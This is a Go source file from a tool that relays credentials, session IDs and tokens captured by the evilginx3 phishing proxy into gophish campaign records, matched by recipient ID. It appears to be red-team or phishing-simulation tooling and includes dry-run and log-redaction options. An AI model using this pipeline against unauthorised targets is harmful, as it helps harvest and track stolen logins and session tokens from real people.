// evilphish — bridges evilginx3 captures into gophish
// Copyright (C) 2026  Ethan Lacerenza
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
package main

import (
	"context"
	"fmt"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"
)

// PollerStats is a lightweight snapshot of what the poller has done, shown by
// the shell "status" command.
type PollerStats struct {
	Running     bool
	StartedAt   time.Time
	LastRun     time.Time
	Forwarded   int
	DryRunHits  int
	Skipped     int
	Sessions    int
	LastErr     string
	LastErrTime time.Time
}

// Poller runs the capture-forwarding loop in the background. It is started
// and stopped from the interactive shell (or started once in headless mode).
type Poller struct {
	cfg  *Config
	logf func(string, ...any)

	mu      sync.Mutex
	cancel  context.CancelFunc
	done    chan struct{} // closed by loop() when it has fully exited
	running bool

	// runtime, (re)built on Start from a config snapshot
	source    SessionSource
	gp        *GophishClient
	state     *State
	statePath string

	loggedSkip map[int64]bool
	stats      PollerStats
}

func NewPoller(cfg *Config, logf func(string, ...any)) *Poller {
	return &Poller{cfg: cfg, logf: logf, loggedSkip: map[int64]bool{}}
}

func (p *Poller) IsRunning() bool {
	p.mu.Lock()
	defer p.mu.Unlock()
	return p.running
}

func (p *Poller) Stats() PollerStats {
	p.mu.Lock()
	defer p.mu.Unlock()
	s := p.stats
	s.Running = p.running
	return s
}

// Start builds the data source and gophish client from the current config and
// launches the background loop. Connection-level config (gophish url/key/tls,
// evilginx db path, state file) is captured here, so changing those requires a
// Restart to take effect; dry-run, poll interval, rid param, phish url,
// user-agent and the form mapping are read live on every tick.
func (p *Poller) Start() error {
	p.mu.Lock()
	defer p.mu.Unlock()
	if p.running {
		return nil
	}

	snap := p.cfg.Snapshot()
	p.source = NewRESPAOFSource(snap.EvilginxDBPath)
	p.gp = NewGophishClient(snap)
	p.statePath = snap.StateFilePath

	st, err := LoadState(p.statePath)
	if err != nil {
		return err
	}
	p.state = st
	p.loggedSkip = map[int64]bool{}

	// Surface a disabled-TLS-verification setting on every start: it is easy to
	// flip on for a lab cert and forget, and it is persisted in config.json.
	if snap.GophishInsecureTLS && p.logf != nil {
		p.logf("WARNING: gophish admin-API TLS verification is DISABLED (config gophish insecure true) — use only for loopback/lab certs")
	}
	if snap.SubmitInsecureTLS && p.logf != nil {
		p.logf("WARNING: phish-server TLS verification is DISABLED (config submit_insecure true) — use only for loopback/lab certs")
	}

	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan struct{})
	p.cancel = cancel
	p.done = done
	p.running = true
	p.stats = PollerStats{Running: true, StartedAt: time.Now()}

	go p.loop(ctx, done)
	return nil
}

// Stop cancels the background loop and blocks until it has fully exited, so a
// subsequent Start never races a still-running poll cycle. It is safe to call
// when not running.
func (p *Poller) Stop() {
	p.mu.Lock()
	cancel := p.cancel
	done := p.done
	wasRunning := p.running
	p.running = false
	p.cancel = nil
	p.done = nil
	p.mu.Unlock()

	if cancel != nil {
		cancel()
	}
	if wasRunning && done != nil {
		<-done // wait for the in-flight cycle to finish before returning
	}
}

// Restart re-reads connection-level config and starts fresh. Stop() already
// waits for the previous loop to exit, so no arbitrary delay is needed.
func (p *Poller) Restart() error {
	p.Stop()
	return p.Start()
}

func (p *Poller) loop(ctx context.Context, done chan struct{}) {
	defer close(done)
	// first poll immediately, then on the interval
	for {
		p.poll()
		select {
		case <-ctx.Done():
			return
		case <-time.After(p.cfg.Interval()):
		}
	}
}

func (p *Poller) setErr(format string, args ...interface{}) {
	msg := fmt.Sprintf(format, args...)
	p.mu.Lock()
	p.stats.LastErr = msg
	p.stats.LastErrTime = time.Now()
	p.mu.Unlock()
	if p.logf != nil {
		p.logf("poll error: %s", msg)
	}
}

// poll runs one scan-and-forward cycle, reading the per-tick config live from a
// fresh snapshot so dry-run, interval and mapping changes apply without a restart.
func (p *Poller) poll() {
	snap := p.cfg.Snapshot()
	dryRun := p.cfg.IsDryRun()

	sessions, err := p.source.FetchNewSessions(p.state.LastSeenID)
	if err != nil {
		p.setErr("%v", err)
		return
	}

	p.mu.Lock()
	p.stats.LastRun = time.Now()
	p.stats.Sessions = len(sessions)
	p.mu.Unlock()

	for _, sess := range sessions {
		if sess.ID > p.state.LastSeenID {
			p.state.LastSeenID = sess.ID
		}
		if !sess.HasAnyCapture() {
			continue
		}

		already := p.state.ForwardedUpdateTime[sess.SessionID]
		if sess.UpdateTime > 0 && sess.UpdateTime <= already {
			continue
		}

		if !sess.HasCredentials() {
			p.logf("session %d (%s, session_id=%s, %s): cookie/token captured without plaintext credentials — not forwarded (gophish capture is form-field based)",
				sess.ID, sess.Phishlet, sess.SessionID, sess.RemoteAddr)
			p.markForwarded(sess)
			continue
		}

		rid := extractRID(sess.LandingURL, snap.RidQueryParam)
		if rid == "" {
			if !p.loggedSkip[sess.ID] {
				p.logf("session %d (%s): no %q param in landing_url — can't correlate to a gophish recipient",
					sess.ID, sess.Phishlet, snap.RidQueryParam)
				p.loggedSkip[sess.ID] = true
			}
			p.bumpSkipped()
			continue
		}

		loc, found, err := p.gp.ResolveRID(rid)
		if err != nil {
			p.setErr("session %d: resolving rid %q: %v", sess.ID, rid, err)
			continue
		}
		if !found {
			if !p.loggedSkip[sess.ID] {
				p.logf("session %d: rid %q not in any gophish campaign yet — will keep trying quietly", sess.ID, rid)
				p.loggedSkip[sess.ID] = true
			}
			continue
		}
		delete(p.loggedSkip, sess.ID)

		fields := buildFormValues(snap.FormFieldMapping, sess)

		postTarget := snap.GophishPhishURL
		if postTarget == "" {
			postTarget = loc.CampaignURL
		}

		if dryRun {
			p.logf("[DRY RUN] would POST to %s?%s=%s recipient=%s campaign=%d fields=%s",
				postTarget, snap.RidQueryParam, rid, redactEmail(loc.Result.Email, snap.LogPlaintext),
				loc.CampaignID, redactFields(fields, snap.LogPlaintext))
			p.mu.Lock()
			p.stats.DryRunHits++
			p.mu.Unlock()
		} else {
			ua := sess.UserAgent
			if ua == "" {
				ua = snap.SubmitUserAgentFallback
			}
			if err := p.gp.SubmitCapturedLogin(postTarget, rid, snap.RidQueryParam, ua, fields); err != nil {
				p.setErr("session %d: submit into gophish failed: %v", sess.ID, err)
				continue
			}
			p.logf("session %d: forwarded capture for recipient %s into campaign %d",
				sess.ID, redactEmail(loc.Result.Email, snap.LogPlaintext), loc.CampaignID)
			p.mu.Lock()
			p.stats.Forwarded++
			p.mu.Unlock()
		}

		p.markForwarded(sess)
	}

	if err := p.state.Save(p.statePath); err != nil {
		p.setErr("saving state: %v", err)
	}
}

func (p *Poller) markForwarded(sess Session) {
	if sess.UpdateTime > 0 {
		p.state.ForwardedUpdateTime[sess.SessionID] = sess.UpdateTime
	} else {
		p.state.ForwardedUpdateTime[sess.SessionID] = time.Now().Unix()
	}
}

func (p *Poller) bumpSkipped() {
	p.mu.Lock()
	p.stats.Skipped++
	p.mu.Unlock()
}

// --- correlation and form-building helpers ---------------------------

func extractRID(landingURL, param string) string {
	if landingURL == "" {
		return ""
	}
	u, err := url.Parse(landingURL)
	if err != nil {
		for _, sep := range []string{"?" + param + "=", "&" + param + "="} {
			if idx := strings.Index(landingURL, sep); idx != -1 {
				rest := landingURL[idx+len(sep):]
				if end := strings.IndexAny(rest, "&#"); end != -1 {
					return rest[:end]
				}
				return rest
			}
		}
		return ""
	}
	return u.Query().Get(param)
}

func buildFormValues(mapping map[string]string, sess Session) url.Values {
	vals := url.Values{}
	for formField, tmpl := range mapping {
		v := tmpl
		v = strings.ReplaceAll(v, "{{username}}", sess.Username)
		v = strings.ReplaceAll(v, "{{password}}", sess.Password)
		v = strings.ReplaceAll(v, "{{session_id}}", sess.SessionID)
		v = strings.ReplaceAll(v, "{{phishlet}}", sess.Phishlet)
		v = strings.ReplaceAll(v, "{{remote_addr}}", sess.RemoteAddr)
		v = strings.ReplaceAll(v, "{{update_time}}", strconv.FormatInt(sess.UpdateTime, 10))
		v = strings.ReplaceAll(v, "{{tokens}}", sess.TokensRaw)
		vals.Set(formField, v)
	}
	return vals
}
